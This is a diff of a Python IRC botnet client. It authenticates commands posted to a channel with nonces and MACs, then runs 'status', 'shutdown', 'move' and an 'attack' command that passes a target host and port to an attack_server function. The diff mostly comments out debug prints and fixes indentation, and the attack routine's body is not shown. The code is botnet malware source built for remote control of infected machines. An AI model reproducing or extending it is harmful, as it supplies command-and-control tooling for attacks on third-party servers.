@@ -39,9 +39,9 @@ def parse_args():
 # Message Parsing
 def parse_message(data: str):
 
-    print("parsing: \n", data)
-    split = data.split()
-    print(split)
+    #print("parsing: \n", data)
+    #split = data.split()
+    #print(split)
 
     prefix = ''
     trailing = []
@@ -184,7 +184,6 @@ def client_program(args: str, sock: socket, bot_nickname: str):
 
     # Ignore anything sent from other bots     
     if(data[:4] == ":bot"):
-       
         return
     
     # Check for bot join or quit
@@ -204,14 +203,19 @@ def client_program(args: str, sock: socket, bot_nickname: str):
         prefix, command, messageContents = parse_message(data)
         parsed_command = messageContents.pop(1)
         trim_parsed_command = parsed_command[0:-4]
-        print(trim_parsed_command)
+        #print(trim_parsed_command)
 
         cmd_data = trim_parsed_command.split()
-        print("cmd_data: ", cmd_data)
+        #print("cmd_data: ", cmd_data)
 
-    if(len(cmd_data) == 1 or len(cmd_data) == 0):
+    
+    if(data == '\n' or len(cmd_data) == 1):
+        return
+
+    if(len(cmd_data) == 0):
         print("lost connection.")
         main()
+    
 
     # checks if a valid command is sent
 
@@ -232,11 +236,9 @@ def client_program(args: str, sock: socket, bot_nickname: str):
             # If macs dont match we ignore comand
             seen_nonces.append(cmd_data[0])
 
-            # Execute command
-
             # If status command is received
             if cmd_data[2] == "status":                 # gives bot status
-                print("status")
+                #print("status")
                 status_cmd(sock, bot_nickname, channel)
 
             # If shutdown command is received    
@@ -247,14 +249,14 @@ def client_program(args: str, sock: socket, bot_nickname: str):
             # If attack command is received    
             elif cmd_data[2] == "attack":
                 split_attack = cmd_data[3].split(":")
-                print(int(split_attack[1]))
+                #print(int(split_attack[1]))
                 attack_server(sock, split_attack[0], int(split_attack[1]), bot_nickname, cmd_data[0], args)
                 commands_exe += 1
 
             # If move command is received    
             elif cmd_data[2] == "move":
                 moveBot = 'PRIVMSG ' + channel + ' :' + bot_nickname + '! \r\n'
-                print(moveBot)
+                #print(moveBot)
                 sock.send(moveBot.encode())
                 split_move = cmd_data[3].split(":")
                 sock.close()
@@ -301,8 +303,8 @@ def main():
                 except ConnectionError:
                     print("lost connection.")
         except ConnectionError:
-        print("Failed to connect.")
-        time.sleep(5)
+            print("Failed to connect.")
+            time.sleep(5)
 
 
 
